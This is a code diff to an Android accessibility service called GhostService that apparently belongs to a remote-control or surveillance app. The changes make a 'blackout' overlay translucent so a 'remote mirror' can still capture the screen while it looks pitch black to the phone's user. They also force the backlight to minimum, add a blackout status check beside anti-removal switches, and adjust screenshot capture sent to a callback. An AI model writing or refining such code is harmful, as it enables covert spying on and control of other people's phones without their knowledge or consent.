@@ -160,7 +160,10 @@ public class GhostService extends AccessibilityService {
                 if (enabled) {
                     if (blackoutView == null) {
                         blackoutView = new View(GhostService.this);
-                        blackoutView.setBackgroundColor(android.graphics.Color.BLACK);
+                        // 82% Black: This is the "Sweet Spot". 
+                        // It provides a much cleaner signal for the remote mirror while 
+                        // remaining virtually pitch black to the human eye on modern mobile screens.
+                        blackoutView.setBackgroundColor(android.graphics.Color.argb(210, 0, 0, 0));
                         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                 WindowManager.LayoutParams.MATCH_PARENT,
                                 WindowManager.LayoutParams.MATCH_PARENT,
@@ -170,13 +173,18 @@ public class GhostService extends AccessibilityService {
                                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                 WindowManager.LayoutParams.FLAG_FULLSCREEN |
-                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, // Allow interaction through mask
-                                android.graphics.PixelFormat.OPAQUE);
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
+                                android.graphics.PixelFormat.TRANSLUCENT);
+                        
+                        // Force hardware backlight to minimum possible value
+                        params.screenBrightness = 0.001f;
+                        params.buttonBrightness = 0.0f;
+                        
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                             params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                         }
                         wm.addView(blackoutView, params);
-                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blackout Mode ACTIVE");
+                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blackout Mode ACTIVE (Dimmed)");
                     }
                 } else {
                     if (blackoutView != null) {
@@ -191,6 +199,11 @@ public class GhostService extends AccessibilityService {
 
     public static boolean isAntiRemovalEnabled() { return !skipAntiRemoval; }
     public static void setAntiRemovalEnabled(boolean enabled) { skipAntiRemoval = !enabled; }
+
+    public static boolean isBlackoutActive() {
+        GhostService instance = getInstance();
+        return instance != null && instance.blackoutView != null;
+    }
 
     public void runAutoHeal() {
         new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
@@ -321,11 +334,11 @@ public class GhostService extends AccessibilityService {
                     try {
                         android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
                         if (bitmap != null) {
-                            android.graphics.Bitmap softwareBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
                             java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
-                            softwareBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
+                            // High quality (70%) for a clear, glitch-free image
+                            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, out);
                             callback.onSuccess(out.toByteArray());
-                            softwareBitmap.recycle(); bitmap.recycle();
+                            bitmap.recycle();
                         } else { callback.onFailure("Buffer wrap failed"); }
                     } catch (Exception e) { callback.onFailure(e.getMessage()); } 
                     finally { if (hardwareBuffer != null) hardwareBuffer.close(); }
